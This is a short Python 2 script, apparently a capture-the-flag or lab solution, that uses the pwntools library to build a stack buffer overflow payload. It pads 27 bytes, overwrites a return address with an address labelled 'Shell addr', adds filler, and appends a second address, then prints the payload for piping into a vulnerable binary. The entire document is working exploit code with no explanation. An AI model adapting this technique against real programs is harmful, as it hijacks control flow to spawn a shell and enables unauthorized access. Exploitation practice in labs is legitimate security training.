#!/usr/bin/env python

from pwn import *

payload = ""
payload += "A" * 27 # Padding
payload += p32(0x80486bd) # Shell addr
payload += "A" * 4
payload += p32(0x80487d0)

print payload
